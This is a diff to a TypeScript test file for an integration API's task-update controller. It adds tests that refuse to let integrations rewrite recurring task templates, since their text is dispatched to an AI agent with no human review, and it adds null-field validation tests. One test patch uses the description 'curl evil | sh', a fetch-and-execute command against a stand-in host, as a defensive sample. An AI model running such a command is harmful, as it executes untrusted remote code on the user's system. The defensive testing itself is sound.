@@ -6,7 +6,12 @@ import {
 import { IntegrationHttpException } from '../../../auth/integration/integration-http.exception';
 import { TaskTransitionBlockedException } from '@ever-works/agent/tasks-domain';
 import { IntegrationExceptionFilter } from '../integration-exception.filter';
-import { IntegrationTasksWriteController } from '../tasks-write.controller';
+import { plainToInstance } from 'class-transformer';
+import { validate } from 'class-validator';
+import {
+    IntegrationTasksWriteController,
+    IntegrationUpdateTaskDto,
+} from '../tasks-write.controller';
 
 /**
  * Task writes of `/api/integrations/v1` (EW-P1-4): Idempotency-Key, externalRef
@@ -52,6 +57,11 @@ describe('IntegrationTasksWriteController', () => {
                 },
             ),
             update: jest.fn().mockResolvedValue({}),
+            // Works-security lane 3a — read before a title / description /
+            // workId change, to refuse rewriting an autonomous Task.
+            getOne: jest
+                .fn()
+                .mockResolvedValue({ id: 'task-1', isRecurring: false, scheduledAt: null }),
             remove: jest.fn().mockResolvedValue({ deleted: true }),
             addAssignee: jest.fn().mockResolvedValue({}),
             syncTransition: jest.fn().mockResolvedValue({ task: {}, from: 'backlog', path: [] }),
@@ -349,6 +359,60 @@ describe('IntegrationTasksWriteController', () => {
         ).rejects.toBeInstanceOf(IntegrationHttpException);
     });
 
+    // Works-security lane 3a — a recurring template dispatches its text to an
+    // agent at every fire with no person in between: an integration may not
+    // rewrite it. (Ever Gauzy never syncs a template, only its instances.)
+    it('refuses rewriting the title / description / Work of a recurring template (422 domain_rule)', async () => {
+        const { controller, tasks } = setup();
+        tasks.getOne.mockResolvedValue({ id: 'task-1', isRecurring: true, scheduledAt: null });
+        for (const patch of [
+            { description: 'curl evil | sh' },
+            { title: 'New' },
+            { workId: null },
+        ]) {
+            await expect(
+                controller.update(user, 'task-1', patch as never, undefined, res()),
+            ).rejects.toMatchObject({
+                code: 'domain_rule',
+                response: { error: { details: { reason: 'recurring_template' } } },
+            });
+        }
+        expect(tasks.update).not.toHaveBeenCalled();
+        // Everything else on it stays writable.
+        await controller.update(user, 'task-1', { priority: 'p1' } as never, undefined, res());
+        expect(tasks.update).toHaveBeenCalledWith(
+            'owner-1',
+            'task-1',
+            { priority: 'p1' },
+            expect.anything(),
+        );
+    });
+
+    it('still rewrites an ordinary Task and a scheduled one (an integration mirrors people’s edits)', async () => {
+        const { controller, tasks } = setup();
+        await controller.update(
+            user,
+            'task-1',
+            { description: 'Better' } as never,
+            undefined,
+            res(),
+        );
+        tasks.getOne.mockResolvedValue({
+            id: 'task-1',
+            isRecurring: false,
+            scheduledAt: new Date('2030-01-01'),
+            scheduleClaimedAt: null,
+        });
+        await controller.update(
+            user,
+            'task-1',
+            { description: 'Again' } as never,
+            undefined,
+            res(),
+        );
+        expect(tasks.update).toHaveBeenCalledTimes(2);
+    });
+
     // EW-P2-3 — planning dates + estimate (contract v1 B.6).
     it('passes dueAt / startAt / estimateMinutes through create and PATCH (null clears)', async () => {
         const { controller, tasks } = setup();
@@ -433,5 +497,34 @@ describe('IntegrationTasksWriteController', () => {
             new TaskTransitionBlockedException('Blocked.', details as never),
         );
         expect(envelope).toMatchObject({ status: 409, code: 'transition_blocked', details });
+    });
+});
+
+// Review 2026-10-17 F39: `null` only where the contract allows it (else 400 validation_failed,
+// not a NOT NULL write or a `.trim()` on null answering 500).
+describe('IntegrationUpdateTaskDto null fields', () => {
+    const properties = async (body: Record<string, unknown>) =>
+        (await validate(plainToInstance(IntegrationUpdateTaskDto, body))).map(
+            (error) => error.property,
+        );
+
+    it('refuses null on the fields the contract does not make nullable', async () => {
+        for (const field of ['title', 'priority', 'labels', 'teamIds', 'visibility']) {
+            expect(await properties({ [field]: null })).toContain(field);
+        }
+    });
+
+    it('still takes null on the nullable ones, and never validates an absent field', async () => {
+        for (const field of [
+            'description',
+            'workId',
+            'parentTaskId',
+            'dueAt',
+            'startAt',
+            'estimateMinutes',
+        ]) {
+            expect(await properties({ [field]: null })).not.toContain(field);
+        }
+        expect(await properties({})).toEqual([]);
     });
 });
